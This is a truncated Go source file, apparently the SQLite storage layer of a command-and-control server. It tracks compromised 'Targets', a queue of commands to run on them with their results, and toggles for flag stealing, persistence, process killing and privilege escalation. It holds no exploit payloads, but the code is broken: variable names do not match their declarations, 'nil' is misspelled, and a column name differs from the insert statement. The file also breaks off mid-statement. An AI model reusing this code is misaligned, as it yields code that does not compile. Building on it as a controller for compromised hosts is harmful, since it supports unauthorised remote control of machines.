package main
import(
	"log"
	"time"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
)

type Target_Base_Info struct{
	Ip string
	System string
	Pc_Name string
	Create_time time.Time
}
type System_Config_Info struct{
	Flag_get_enable bool
	Flag_send_type string
	Kill_process_enable bool
	Privilege_promotion_enable bool
}
type Target_info struct{
	Target_base_info Target_Base_Info
	System_config_info System_Config_Info
}
type Cmd_info struct{
	Id int
	Target_id int
	Cmd_type string
	Cmd_value string
	Cmd_time time.Time
	Cmd_exec bool
	Cmd_exec_time time.Time
	Cmd_exec_result string
	Cmd_cycle_period_second int
}

type Mysqldb struct{
	Sqldb *sql.DB
}

func connectDB() (*Mysqldb,error){
	db,error := sql.Open("sqlite3","./foo.db")
	if err != nil{
		return nil,err
	}
	if err = db.Ping();err!=nil{
		return nil,err
	}
	return &Mysqldb{db},nil
}

func(p Mysqldb)Close(){
	p.Sqldb.Close()
}

func(p Mysqldb)DbSetup(){
	var err error
	const tableDDL = `
	CREATE TABLE IF NOT EXISTS Targets (
		id				INTEGER		PRIMARY KEY AUTOINCREMENT
								UNIQUE
								NOT NULL,
		ip				VARCHAR (16)	UNIQUE
								NOT NULL,
		system				VARCHAR (16),
		pc_name				VARCHAR (128),
		create_time			DATETIME	NOT NULL,
		flag_get_enable			BOOLEAN		DEFAULT	(false)
								NOT NULL,
		flag_send_type			VARCHAR (16)	NOT NULL
								DEFAULT dontsend,
		persistence_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		kill_process_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		privilege_promotion_enable	BOOLEAN		NOT NULL
								DEFAULT (false)
	);
	CREATE TABLE IF NOT EXISTS Cmds (
		id				INTEGER		PRIMARY KEY AUTOINCREMENT
								UNIQUE
								NOT NULL,
		target_id			INTEGER		REFERENCES Targets (id) ON DELETE NO ACTION
											ON UPDATE NO ACTION
											MATCH [FULL]
								NOT NULL,
		cmd_type			VARCHAR (8)	NOT NULL
								DEFAULT control,
		cmd_value			TEXT		NOT NULL,
		cmd_time			DATETIME	NOT NULL,
		cmd_exec			BOOLEAN		NOT NULL
								DEFAULT (false),
		cmd_exec_time			DATETIME	NOT NULL
								DEFAULT [1900-00-00 00:00:00],
		cmd_exec_result			TEXT		NOT NULL
								DEFAULT "",
		cmd_cycle_period_second 	INTEGER		NOT NULL
								DEFAULT (0)
	);
	CREATE TABLE IF NOT EXISTS System_config (
		flag_get_enable			BOOLEAN		NOT NULL
								DEFAULT (false),
		flag_send_type			VARCHAR (16)	NOT NULL
								DEFAULT dontsend,
		persistence_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		kill_process_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		priilege_promotion_enable 	BOOLEAN		NOT NULL
								DEFAULT (false)
	);
	`
	_,err = p.Sqldb.Exec(tableDLL)
	if err != nil{
		log.Println(err)
		return
	}
	count := 0
	err = p.Sqldb.QueryRow("select count(*) from System_config").Scan(&count)
	if count == 0 {
		const insertDML = "INSERT OR IGNORE INTO System_config (flag_get_enable,flag_send_type,persistence_enable,kill_process_enable,privilege_promotion_enable) VALUES (?,?,?,?,?)"
		stmt,err:=p.Sqldb.Prepare(insertDML)
		if err != nil {
			log.Println(err)
			return
		}
		defer stmt.Close()
		_,err=stmt.Exec(false,"dontsend",false,false,false)
		if err != nill{
			log.Println(err)
			return
		}
	}
}
func (p Mysqldb)Insert_targets(target_info Target_info) (error){
	const inserDML = "INSERT INTO Targets (ip,system,pc_name,create_time,flag_get_enable,flag_send_type,persistence_enable,kill_process_enable,privilege_promotion_enable) VALUES (?,?,?,?,?,?,?,?,?)"
	stmt,err := p.Sqldb.Prepare(insertDML)
	if error != nil{
		log.Println(err)
		return err
	}
	defer stmt.Close()
	result,err := stmt.Exec(target_info.Target_base_info.Ip,target_info.Target_base_info.System,

